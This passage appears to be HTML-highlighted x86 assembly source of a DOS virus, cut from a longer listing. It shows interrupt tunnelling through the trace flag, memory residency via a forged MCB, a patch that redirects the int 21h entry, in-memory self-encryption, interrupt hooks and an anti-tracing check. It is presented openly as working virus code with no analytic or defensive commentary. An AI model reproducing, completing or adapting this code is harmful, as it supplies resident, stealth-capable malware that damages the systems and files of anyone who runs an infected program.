                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">seg_i1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Store it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2Fh</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Offset int 2Fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">ofs_i2f</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; Store it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2Fh</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Segment int 2Fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">seg_i2f</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; Store it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">int_1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Tunneler</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">   
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; AX:=flags</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">                      </span><span class="sc1">; Trace flag on</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">    
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">start_tunneling</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Move over, I said move over'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Hey, hey, hey, clear the way'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'There''s no escape from my authority - I tell you -'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">start_tunneling</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ABCDh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">; Simulated int 2Fh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9Ah</span><span class="sc0">                     </span><span class="sc1">; call far</span><span class="sc0">
</span><span class="sc5">ofs_i2f</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">seg_i2f</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; AX:=flags</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc0">                 </span><span class="sc1">; Trace flag off</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">                            </span><span class="sc1">; Stop tunneling</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">ofs_i1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">; Restore original int 1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">seg_i1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1300h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_2f</span><span class="sc0">                  </span><span class="sc1">; Get real int13h in DS:DX</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">ofs_i13</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; Store it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">seg_i13</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1300h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_2f</span><span class="sc0">          </span><span class="sc1">; Restore address from previous call</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">make_resident</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">ofs_i1</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">seg_i1</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">int_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">   
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getdelta_i1</span><span class="sc0">
</span><span class="sc5">getdelta_i1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">getdelta_i1</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; Get delta-offset</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; Flags</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">realseg_i2f</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; Original int 2Fh segment?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_real_i2f</span><span class="sc0">             </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">0Ah</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Get int 2fh offset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">realofs_i2f</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; Store it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">             </span><span class="sc1">; Flags</span><span class="sc0">
</span><span class="sc5">no_real_i2f</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">    
        </span><span class="sc6">iret</span><span class="sc0">    

</span><span class="sc5">int_2f</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">   
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9Ah</span><span class="sc0">     </span><span class="sc1">; call far</span><span class="sc0">
</span><span class="sc5">realofs_i2f</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">realseg_i2f</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">make_resident</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; ES-&gt;MCB</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Get 'M' or 'Z'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">     </span><span class="sc1">; Mark current block as 'middle'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">VIRUSCODE_SIZE</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">; div 16</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">40000</span><span class="sc4">/</span><span class="sc2">16</span><span class="sc0">             </span><span class="sc1">; Space for encryption buffers</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Build a new MCB</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">               </span><span class="sc1">; Put 'M' or 'Z'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Block owner name</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; Paragraph of owner</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">; Chain next MCB</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VIRUSCODE_SIZE</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
</span><span class="sc5">l_copy_code</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Copy code to new MCB</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l_copy_code</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; ES:=0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Get int 21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">seg_i21</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">         </span><span class="sc1">; Store it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ofs_i21</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">seg_i21_2</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ofs_i21_2</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Read 2 bytes from int 21h entry</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">_2bytes_21h</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store bytes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0ACCDh</span><span class="sc0">          </span><span class="sc1">; Change bytes to 'int 0ACh'</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">int_24</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; Get random number</span><span class="sc0">
</span><span class="sc5">l_crypt_memcode</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">mem_mask</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">; Store mask</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">                 </span><span class="sc1">; Encrypt code in memory</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l_crypt_memcode</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">; ES:=0</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0ABh</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">int_ab</span><span class="sc4">)-</span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc1">; Set new int 0ABh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0ABh</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0ACh</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">int_ac</span><span class="sc4">)-</span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc1">; Set new int 0ACh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0ACh</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1Ch</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">int_1c</span><span class="sc4">)-</span><span class="sc2">100h</span><span class="sc0">  </span><span class="sc1">; Set new int 1Ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1Ch</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">6h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">int_6</span><span class="sc4">)-</span><span class="sc2">100h</span><span class="sc0">    </span><span class="sc1">; Set new int 6</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">6h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">_signature</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">;??</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">returnAX_fffn</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">   </span><span class="sc1">;??</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">restore_exec_host</span><span class="sc0">

</span><span class="sc5">int_ab</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">':)'</span><span class="sc0">         </span><span class="sc1">; Check if anyone is tracing</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0"> 
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">
